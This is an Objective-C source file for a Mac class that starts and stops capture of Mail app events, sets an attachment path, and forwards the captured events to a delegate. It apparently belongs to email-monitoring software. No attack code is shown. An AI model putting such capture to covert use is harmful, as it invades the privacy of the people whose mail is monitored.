//
//  MailCaptureManagerForMac.m
//  MailCaptureManagerForMac
//
//  Created by ophat on 5/27/16.
//  Copyright (c) 2016 ophat. All rights reserved.
//

#import "MailCaptureManagerForMac.h"
#import "MailAppCapture.h"

@implementation MailCaptureManagerForMac

@synthesize mMailCapture;
@synthesize mDelegate;

-(id) initWithAttachment:(NSString *)aAttachment{
    if (self = [super init]) {
        mMailCapture = [[MailAppCapture alloc] init];
        [mMailCapture setMDelegate:self];
        [mMailCapture setMSelector:@selector(emailEventCaptured:)];
        [mMailCapture setMThread:[NSThread currentThread]];
        [mMailCapture setMAttachPath:aAttachment];
    }
    return self;
}

- (void) registerEventDelegate: (id <EventDelegate>) aEventDelegate {
    mDelegate = aEventDelegate;
}

- (void) unregisterEventDelegate {
    mDelegate = nil;
}

- (void) emailEventCaptured: (FxEvent *) aEvent {
    NSLog(@"emailEventCaptured, %@", aEvent);
    if ([mDelegate respondsToSelector:@selector(eventFinished:)]) {
        [mDelegate performSelector:@selector(eventFinished:) withObject:aEvent];
    }
}

-(void) startCapture{
    [mMailCapture startCapture];
}
-(void) stopCapture{
    [mMailCapture stopCapture];
}

-(void) dealloc{
    [mMailCapture release];
    [super dealloc];
}

@end
